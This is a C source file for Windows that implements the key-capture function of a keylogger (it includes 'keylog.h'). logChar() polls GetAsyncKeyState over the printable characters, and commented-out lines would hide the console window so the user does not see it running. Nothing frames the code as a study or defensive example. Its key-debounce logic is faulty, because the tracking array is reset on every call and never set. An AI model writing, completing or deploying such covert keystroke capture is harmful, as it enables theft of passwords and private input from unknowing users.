#define _WIN32_WINNT 0x0500

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include <stdbool.h>

#include "keylog.h"

char logChar()
{
    //HWND hwnd=GetConsoleWindow();
    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
    //ShowWindow(hwnd,SW_HIDE);
    bool keyDown[94] = {false};
        for(int i = 32; i < 127; i++){
            if ((GetAsyncKeyState(i) & 0x8000) && !keyDown[i-32]) {
                return (char)i;
            }else if (!(GetAsyncKeyState(i) & 0x8000)) {
                keyDown[i-32] = false;
            }            
        }
 
 return '\0';
}
